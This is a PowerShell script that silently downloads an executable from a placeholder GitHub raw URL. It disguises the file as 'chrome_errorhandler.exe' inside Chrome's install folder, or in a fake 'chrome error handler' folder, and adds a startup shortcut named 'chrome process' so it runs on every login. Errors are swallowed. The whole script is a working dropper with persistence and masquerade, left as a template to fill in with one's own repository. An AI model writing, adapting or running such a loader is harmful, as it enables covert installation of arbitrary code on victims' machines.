# Silent PowerShell: Download EXE, place in Chrome (or fallback folder), add startup shortcut
# Replace with your actual repo details
$downloadUrl = "https://raw.githubusercontent.com/yourusername/yourrepo/main/chrome_errorhandler.exe"  # Your EXE's raw URL
$exeName = "chrome_errorhandler.exe"  # Your EXE filename

# Temp download spot
$tempPath = $env:TEMP + "\" + $exeName

# Try to find Chrome dir (common paths on Win10)
$chromeDir = $null
$possiblePaths = @(
    "C:\Program Files\Google\Chrome\Application\",
    "C:\Program Files (x86)\Google\Chrome\Application\"
)
foreach ($path in $possiblePaths) {
    if (Test-Path $path) {
        $chromeDir = $path
        break
    }
}

# Fallback if no Chrome
if (-not $chromeDir) {
    $chromeDir = "C:\Program Files\chrome error handler\"  # Create this folder
    New-Item -ItemType Directory -Path $chromeDir -Force | Out-Null
}

# Final EXE spot
$finalExePath = $chromeDir + $exeName

# Startup folder
$startupFolder = [Environment]::GetFolderPath("Startup")
$shortcutPath = $startupFolder + "\chrome process.lnk"  # Your shortcut name

# Download & place
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $tempPath)
    
    if (Test-Path $tempPath) {
        Move-Item -Path $tempPath -Destination $finalExePath -Force | Out-Null
        
        # Create "chrome process" shortcut
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $finalExePath
        $shortcut.WorkingDirectory = $chromeDir.TrimEnd("\")  # Parent dir for working
        $shortcut.Save()
    }
}
catch {
    # Silent fail
}

# Cleanup
if ($webClient) { $webClient.Dispose() }
if ($wshShell) { [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wshShell) | Out-Null }
if ($shortcut) { [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shortcut) | Out-Null }
